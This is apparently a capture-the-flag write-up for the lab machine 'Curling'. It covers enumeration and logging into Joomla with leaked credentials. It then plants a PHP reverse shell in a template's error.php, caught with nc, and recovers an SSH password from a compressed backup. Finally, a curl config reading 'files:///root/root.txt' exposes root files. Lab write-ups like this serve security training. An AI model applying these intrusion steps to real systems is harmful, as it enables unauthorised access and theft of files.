# Curling
### Info:

OS: Linux <br>
IP: 10.10.10.150 <br>
Difficulty : easy-medium <br>

### Enumeration:
```nmap -sC -sV -oA nmap 10.10.10.150``` <br>

gives us the results : <br>

```
# Nmap 7.70 scan initiated Thu Jan 10 00:13:42 2019 as: nmap -sC -sV -oA nmap 10.10.10.150
Nmap scan report for 10.10.10.150
Host is up (0.59s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 10 00:14:14 2019 -- 1 IP address (1 host up) scanned in 32.46 seconds
```
As `Joomla CMS` is present at port 80 we find version details at  `/administrator/manifests/files/joomla.xml` <br>
Web page gives us the name of `super user : Floris` and we get a hint from source about `/secret.txt`<br> 
which gives us the  `password : Curling2018!(Q3VybGluZzIwMTgh)` <br>
Using dirbuster we get `/administrator/` where we can login with the above username and play with the CMS <br>

### Exploitation:
On going into extensions>templates>beez3 we get php files for that particular template where we can edit the files <br>
We edited error.php with `php-reverse-shell.php` and run this script at `/templates/beez3/error.php` <br> 
while listening via nc on specific port we get :
```
root@kali:~# nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [10.10.16.16] from (UNKNOWN) [10.10.10.150] 57974
Linux curling 4.15.0-22-generic #24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 09:17:08 up 3 days, 10:16,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

### Privilege Escalation (User):
 By `ls /home/floris` we get a password_backup file which had been `compressed with bz2` (by looking at file signatures)<br>
 Moving it to /tmp directory and decompressing it we get a `gzip file`.  <br>
 Repeating the decompressions we get a password.txt which had `5d<wdCbdZu)|hChXll` <br>
 
 Now we get password for user thereby :
 ```
 root@kali:~# ssh floris@10.10.10.150
floris@10.10.10.150's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jan 10 09:35:04 UTC 2019

  System load:  0.08              Processes:            162
  Usage of /:   47.8% of 9.78GB   Users logged in:      0
  Memory usage: 37%               IP address for ens33: 10.10.10.150
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jan  9 22:19:25 2019 from 10.10.16.16
floris@curling:~$ 
```
where we get user.txt <br>
For root.txt we find 2 files in the dir `input and report`. Changing the contents of input changes the report. <br>
So everything is present on the local host therefore setting input as:
```
url = "files:///root/root.txt"
```
We get root.txt content in the report.

### Things Learned :

PHP reverse shell injection. <br>

Viewing local directories using Curl <br>

